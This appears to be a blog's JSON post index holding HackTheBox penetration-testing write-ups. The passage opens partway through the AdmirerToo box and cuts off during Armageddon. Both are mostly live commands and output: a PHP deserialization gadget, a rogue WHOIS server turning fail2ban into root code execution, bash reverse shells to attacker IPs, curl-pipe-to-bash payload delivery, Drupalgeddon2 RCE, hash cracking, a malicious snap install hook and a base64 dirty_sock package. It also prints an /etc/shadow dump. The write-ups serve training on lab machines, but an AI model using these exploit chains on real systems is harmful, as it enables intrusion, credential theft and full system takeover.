by Fail2Ban after             &lt;failures&gt; attempts against &lt;name&gt;.\\n\\n             Here is more information about &lt;ip&gt; :\\n             `%(_whois_command)s`\\n             Regards,\\n             Fail2Ban\"|mail -s \"[Fail2Ban] &lt;name&gt;: banned &lt;ip&gt; from &lt;fq-hostname&gt;\" &lt;dest&gt; ...   To exploit the vulnerability we must have control on whois output. Luckly opencats run with devel privileges and is vulnerable to PHP Object Injectionm leading to arbitrary file write. Devel has write privileges on /usr/local/etc, a secondary directory for configuration files, and so he can write here an arbitrary whois.conf that can be used to exploit the RCE in fail2ban  jennifer@admirertoo:/opt/opencats$ ls -ald /usr/local/etc drwxrwxr-x 2 root devel 4096 Jul  7  2021 /usr/local/etc   Because the PHP deserialization writes json, we need to craft a specific POP gadget to write a clean conf file:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ echo '}]|. [10.10.14.2]' &gt; /tmp/payload  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/B2R/AdmirerToo] ‚îî‚îÄ$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /tmp/payload a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D   Exploited the PHP Object Injection and wrote the conf file:  GET /index.php?m=activity&amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.1 Host: 127.0.0.1:1337 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: CATS=rsiut3ufujk9etpjqesshnchfr Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1   jennifer@admirertoo:~$ ls /usr/local/etc/ jennifer@admirertoo:~$ ls /usr/local/etc/ whois.conf jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf [{\"Expires\":1,\"Discard\":false,\"Value\":\"}]|. [10.10.14.2]\\n\"}]   Preparing and testing the WHOIS rogue server:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ echo '~| bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.2/10099 0&gt;&amp;1\" &amp;' &gt; fail2ban-rev.sh  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ sudo nc -nvlkp 43 -c \"cat fail2ban-rev.sh\" [sudo] password for kali: listening on [any] 43 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 52964   jennifer@admirertoo:~$ whois 10.10.14.2 ~| bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.2/10099 0&gt;&amp;1\" &amp; fgets: Connection reset by peer   Now we can force fail2ban into banning our IP in order to send an email to root (with root privileges) containing out malicious payload and obtaining RCE.  Rogue WHOIS server:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ sudo nc -nvlkp 43 -c \"cat fail2ban-rev.sh\" [sudo] password for kali:  listening on [any] 43 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 52976   Attempting to get banned:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ ssh jennifer@admirertoo.htb ssh: connect to host admirertoo.htb port 22: Connection refused                                                                                                                      ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ ssh jennifer@admirertoo.htb jennifer@admirertoo.htb's password:  Permission denied, please try again. jennifer@admirertoo.htb's password:  Permission denied, please try again. jennifer@admirertoo.htb's password:  jennifer@admirertoo.htb: Permission denied (publickey,password).                                                                                                                      ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ ssh jennifer@admirertoo.htb ssh: connect to host admirertoo.htb port 22: Connection refused ...   Reverse shell:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 34928 bash: cannot set terminal process group (14620): Inappropriate ioctl for device bash: no job control in this shell root@admirertoo:/## id &amp;&amp; cat ~/root.txt &amp;&amp; hostname id &amp;&amp; cat ~/root.txt &amp;&amp; hostname uid=0(root) gid=0(root) groups=0(root) 54f21ac1641a6ec72be23bdfd993c1c1 admirertoo root@admirertoo:/##    Trophy   User.txt  c171776485c8d1852be98f88edbba763  Root.txt  54f21ac1641a6ec72be23bdfd993c1c1  /etc/shadow  root@admirertoo:/## cat /etc/shadow cat /etc/shadow root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7::: daemon:*:18815:0:99999:7::: bin:*:18815:0:99999:7::: sys:*:18815:0:99999:7::: sync:*:18815:0:99999:7::: games:*:18815:0:99999:7::: man:*:18815:0:99999:7::: lp:*:18815:0:99999:7::: mail:*:18815:0:99999:7::: news:*:18815:0:99999:7::: uucp:*:18815:0:99999:7::: proxy:*:18815:0:99999:7::: www-data:*:18815:0:99999:7::: backup:*:18815:0:99999:7::: list:*:18815:0:99999:7::: irc:*:18815:0:99999:7::: gnats:*:18815:0:99999:7::: nobody:*:18815:0:99999:7::: _apt:*:18815:0:99999:7::: systemd-timesync:*:18815:0:99999:7::: systemd-network:*:18815:0:99999:7::: systemd-resolve:*:18815:0:99999:7::: messagebus:*:18815:0:99999:7::: systemd-coredump:!!:18815:::::: opentsdb:*:18815:0:99999:7::: hbase:!:18815:0:99999:7::: mysql:!:18816:0:99999:7::: jennifer:$6$LWi8tlOmIOw6zGZa$A5h4DjTnRwW3GhZnA288bi4zKk892yRGon5kBhKao3biY8AWo3.qTFdlEIAPJ.ebKewW31JWbbXlpl/r.aLIC/:18817:0:99999:7::: sshd:*:18816:0:99999:7::: Debian-exim:!:18827:0:99999:7::: devel:!:18829:0:99999:7:::"
  },
  
  {
    "title": "HackTheBox - Armageddon",
    "url": "/posts/armageddon/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Introduction Armageddon is a Easy difficulty Linux box based on a Drupal application vulnerable to Drupalgeddon2 (CVE-2018-7600), which allows to get a low privileged shell as the apache user. Local enumeration allowed to identify MySQL credentials inside a Drupal configuration file and get access to various databases from which it is possible to extract usernames and relative hash. Cracking the hashes locally it was possible to retrieve the password of brucetherealadmin, obtaining user access to the target and discovering  that it was allowed run snap with high privileges. Finally, a malicious snap package was both crafted from scratch as well as extracted from a dirty_sock exploit in order to execute custom code with high privileges and obtain a high privileged shell.  Improved skills:    Drupalgeddon2 (CVE-2018-7600) exploitation   Password hunting and hash cracking   snap privilege escalation (from scratch and using dirty_sock)   Used tools:    nmap   gobuster   searchsploit   hashcat     Enumeration Scanned all TCP scan: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Armageddon] ‚îî‚îÄ$ sudo nmap -sS -p- 10.10.10.233 -oN scans/all-tcp-ports.txt -v ... PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http   Enumerated open TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Armageddon] ‚îî‚îÄ$ sudo nmap -sT -sV -sC -A -p22,80 10.10.10.233 -oN scans/open-tcp-ports.txt ... PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: |   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) |   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to  Armageddon |  Armageddon Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.10 - 4.11 (93%), Linux 5.1 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops   Nmap discovered only two open services running on the target: an ssh service on port 22 (OpenSSH 7.4) and an Apache web server running on port 80 which disclosed different versions and information, including the target OS and the exact version of PHP and Drupal.  The web application was the following:   It were enumerated files and directories: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Armageddon] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o scans/p80-directories.txt ... /modules              (Status: 301) [Size: 236] [--&gt; http://10.10.10.233/modules/] /includes             (Status: 301) [Size: 237] [--&gt; http://10.10.10.233/includes/] /scripts              (Status: 301) [Size: 236] [--&gt; http://10.10.10.233/scripts/] /themes               (Status: 301) [Size: 235] [--&gt; http://10.10.10.233/themes/]   /misc                 (Status: 301) [Size: 233] [--&gt; http://10.10.10.233/misc/]     /profiles             (Status: 301) [Size: 237] [--&gt; http://10.10.10.233/profiles/] /sites                (Status: 301) [Size: 234] [--&gt; http://10.10.10.233/sites/]  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Armageddon] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.233 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o scans/p80-files.txt ... /cron.php             (Status: 403) [Size: 7388] /xmlrpc.php           (Status: 200) [Size: 42]   /update.php           (Status: 403) [Size: 4057] /install.php          (Status: 200) [Size: 3172] /index.php            (Status: 200) [Size: 7440] /.htaccess            (Status: 403) [Size: 211] /web.config           (Status: 200) [Size: 2200] /robots.txt           (Status: 200) [Size: 2189] /.html                (Status: 403) [Size: 207] /.htpasswd            (Status: 403) [Size: 211] /.htm                 (Status: 403) [Size: 206] /.htpasswds           (Status: 403) [Size: 212] /.gitignore           (Status: 200) [Size: 174] /.htgroup             (Status: 403) [Size: 210] /authorize.php        (Status: 403) [Size: 2824] /.htaccess.bak        (Status: 403) [Size: 215] /.htuser              (Status: 403) [Size: 209] /.htc                 (Status: 403) [Size: 206] /.ht                  (Status: 403) [Size: 205]  But no luck.  A new account was created, however an error occurred:  Error: Unable to send e-mail. Contact the site administrator if the problem persists.   Reading the contents of robots.txt it was possible to identify the exact version of Drupal: ... User-agent: * Crawl-delay: 10 ... # Files Disallow: /CHANGELOG.txt Disallow: /cron.php Disallow: /INSTALL.mysql.txt Disallow: /INSTALL.pgsql.txt Disallow: /INSTALL.sqlite.txt ...     Once obtained the exact version it was searched on Exploit-DB for existing exploits targeting this exact version:   Foothold Drupal 7.56 is vulnerable to CVE-2018-7600, also known as Drupalgeddon2:     Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.   The PoC found on Exploit-DB was written for Metasploit, however a different one, written in python, was available on GitHub and provided a handy remote code execution: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/exploit] ‚îî‚îÄ$ python3 drupa7-CVE-2018-7600.py -c id http://10.10.10.233  ============================================================================= |          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           | |                              by pimps                                     | =============================================================================  [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-kmITQbaSIIYQosXDMhx9WqGPcsWC76WQY4PviJGMRZ8 [*] Triggering exploit to execute: id uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0   In order to obtain an interactive reverse shell it was first enumerated the path to the bash shell on the target: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/exploit] ‚îî‚îÄ$ python3 drupa7-CVE-2018-7600.py -c 'which bash' http://10.10.10.233  ============================================================================= |          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           | |                              by pimps                                     | =============================================================================  [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-1eQEjWcQiE4n6N7v_3C91NRGfSlWHusR6hEXzf4lWKw [*] Triggering exploit to execute: which bash /usr/bin/bash   After that a bash reverse shell was downloaded and executed on the target.  Bash reverse shell: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/exploit] ‚îî‚îÄ$ echo '/usr/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.24/443 0&gt;&amp;1' &gt; rev.sh  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...   Downloaded and executed the reverse shell: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/exploit] ‚îî‚îÄ$ python3 drupa7-CVE-2018-7600.py -c 'curl 10.10.14.24/rev.sh | /usr/bin/bash' http://10.10.10.233  ============================================================================= |          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           | |                              by pimps                                     | =============================================================================  [*] Poisoning a form and including it in cache. [*] Poisoned form ID: form-fHJFX_5z9MDk5LrRfNrgjwIHRMsbcxb0UTQwhm1K8a8 [*] Triggering exploit to execute: curl 10.10.14.24/rev.sh | /usr/bin/bash   Obtained the shell back: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/exploit] ‚îî‚îÄ$ sudo nc -nlvp 443 listening on [any] 443 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.233] 37696 bash: no job control in this shell bash-4.2$ id id uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0   Lateral Movement User loocal enumeration showed only one user: bash-4.2$ cat /etc/passwd | grep -v nologin cat /etc/passwd | grep -v nologin root:x:0:0:root:/root:/bin/bash brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash   Because the target ran a Drupal application, it was possible that the user reused the same password to connect the application to the DB or to register on the the site.  Hardcoded passwords were thus searched within Drupal‚Äôs configuration files: Searched hardcoded passwords: bash-4.2$ grep -ri \"password\" . --color 2&gt;/dev/null ... ./sites/default/settings.php: *     'password' =&gt; 'password', ./sites/default/settings.php:      'password' =&gt; 'CQHE&lt;redacted&gt;', ... bash-4.2$ cat ./sites/default/settings.php | grep -C5 password ... --   array (     'default' =&gt;     array (       'database' =&gt; 'drupal',       'username' =&gt; 'drupaluser',       'password' =&gt; 'CQHE&lt;redacted&gt;',       'host' =&gt; 'localhost',       'port' =&gt; '',       'driver' =&gt; 'mysql',       'prefix' =&gt; '',     ), ...   The drupaluser password didn‚Äôt provide SSH access to the box, so it was used to access the db: bash-4.2$ mysql -h localhost -u drupaluser -p mysql -h localhost -u drupaluser -p Enter password: CQHE&lt;redacted&gt;  ****struck****   The command stuck because the shell was not an interactive shell. To overcome the problem the DB was enumerated using the non-interactive mysql client syntax: bash-4.2$ mysql -h localhost -u drupaluser --password='CQHE&lt;redacted&gt;' -e 'show databases;' w databases;'lhost -u drupaluser --password='CQHE&lt;redacted&gt;' -e 'sho Database information_schema drupal mysql performance_schema bash-4.2$ mysql -h localhost -u drupaluser --password='CQHE&lt;redacted&gt;' -e 'use drupal; show tables;'  drupal; show tables;'drupaluser --password='CQHE&lt;redacted&gt;' -e 'use Tables_in_drupal actions authmap ... users users_roles variable watchdog  bash-4.2$ mysql -h localhost -u drupaluser --password='CQHE&lt;redacted&gt;' -e 'use drupal; select * from users;'  drupal; select * from users;'er --password='CQHE&lt;redacted&gt;' -e 'use uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data 0                                               NULL    0       0       0       0       NULL            0               NULL 1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.&lt;redacted&gt;      admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu        a:1:{s:7:\"overlay\";i:1;} 3       maoutis $S$DwGOcpJqCIm5IFUnN5uIZAfvmcUVfiCzIkxidLjIBdIkJ0DJy2/o maoutis@hackthebox.htb                  filtered_html   1619776834      0       0       0       Europe/London           0       maoutis@hackthebox.htb  NULL 4       maoutis2        $S$DPO4Jtqc/QPUv6GtEnxTZQnV0/LIGoQwJ7ksoN2gngjefK4DFQOT maoutis@protonmail.com                  filtered_html   1619782683      0       0       0       Europe/London           0       maoutis@protonmail.com  NULL   The hash for the brucetherealadmin was then extracted and brute-forced using hashcat: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/loot] ‚îî‚îÄ$ hashid brucetherealadmin.hash --File 'brucetherealadmin.hash'-- Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.&lt;redacted&gt;' [+] Drupal &gt; v7.x --End of file 'brucetherealadmin.hash'--  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/loot] ‚îî‚îÄ$ hashcat -h | grep -i drupal    7900 | Drupal7                                          | Forums, CMS, E-Commerce  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/loot] ‚îî‚îÄ$ hashcat brucetherealadmin.hash /usr/share/wordlists/rockyou.txt -m7900 --force ... $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.&lt;redacted&gt;:bo&lt;redacted&gt; ...  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Armageddon/loot] ‚îî‚îÄ$ ssh brucetherealadmin@10.10.10.233 brucetherealadmin@10.10.10.233 password: Last failed login: Fri Apr 30 13:50:50 BST 2021 from 10.10.14.24 on ssh:notty There were 2 failed login attempts since the last successful login. Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5 [brucetherealadmin@armageddon ~]$ id uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023   Privilege Escalation Enumerated sudo capabilities for bruce: [brucetherealadmin@armageddon ~]$ sudo -l Matching Defaults entries for brucetherealadmin on armageddon:     !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\", env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\",     env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\", env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\", env_keep+=\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\",     secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin  User brucetherealadmin may run the following commands on armageddon:     (root) NOPASSWD: /usr/bin/snap install *   Enumerated snap version: [brucetherealadmin@armageddon ~]$ snap version snap    2.47.1-1.el7 snapd   2.47.1-1.el7 series  16 centos  7 kernel  3.10.0-1160.6.1.el7.x86_64   Searched for an existing PoC to escalate privileges abusing snap and found it on HackTricks    If snap is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.   Created the malicious package (note the amd64 parameter instead of all during the fpm package creation): ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp] ‚îî‚îÄ$ COMMAND='echo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd'  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp] ‚îî‚îÄ$ cd $(mktemp -d)  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/tmp.gOIiDpu1dV] ‚îî‚îÄ$ mkdir -p meta/hooks  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/tmp.gOIiDpu1dV] ‚îî‚îÄ$ printf '#!/bin/sh\\n%s; false' \"$COMMAND\" &gt;meta/hooks/install  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/tmp.gOIiDpu1dV] ‚îî‚îÄ$ chmod +x meta/hooks/install  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/tmp.gOIiDpu1dV] ‚îî‚îÄ$ fpm -n xxxx -s dir -t snap -a amd64 meta Created package {:path=&gt;\"xxxx_1.0_all.snap\"}  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/tmp.gOIiDpu1dV] ‚îî‚îÄ$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...   Downloaded and executed the malicious package : [brucetherealadmin@armageddon ~]$ curl 10.10.14.24/xxxx_1.0_all.snap -o xxxx_1.0_all.snap   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100  4096  100  4096    0     0  32110      0 --:--:-- --:--:-- --:--:-- 32507  [brucetherealadmin@armageddon ~]$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode error: cannot perform the following tasks: - Run install hook of \"xxxx\" snap if present (run hook \"install\": exit status 1)  [brucetherealadmin@armageddon ~]$ cat /etc/passwd | grep root2 root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash   Escalated to root using the injected root2 user: [brucetherealadmin@armageddon ~]$ su root2 Password:  [root@armageddon brucetherealadmin]# id &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 armageddon.htb 0ec8a6e6cb... ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.233  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 fe80::7648:5ea1:5371:b3b5  prefixlen 64  scopeid 0x20&lt;link&gt;         inet6 dead:beef::69d1:bb00:780c:f997  prefixlen 64  scopeid 0x0&lt;global&gt;         ether 00:50:56:b9:bb:03  txqueuelen 1000  (Ethernet)         RX packets 274214  bytes 62806887 (59.8 MiB)         RX errors 0  dropped 250  overruns 0  frame 0         TX packets 258557  bytes 100237774 (95.5 MiB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 496  bytes 50072 (48.8 KiB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 496  bytes 50072 (48.8 KiB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0     The second way to craft the malicious snap is to copy the snap package from an already existing exploit (this was how I realized that using all instead of amd64 did not work on this box):  PoC:  [brucetherealadmin@armageddon ~]$ python3 -c 'print(\"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\" + \"A\"*4256 + \"==\")' | base64 -d &gt; privesc.snap [brucetherealadmin@armageddon ~]$ sudo snap install privesc.snap --devmode --dangerous dirty-sock 0.1 installed [brucetherealadmin@armageddon ~]$ tail /etc/passwd nobody:x:99:99:Nobody:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:999:998:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash [brucetherealadmin@armageddon ~]$ su dirty_sock Password: 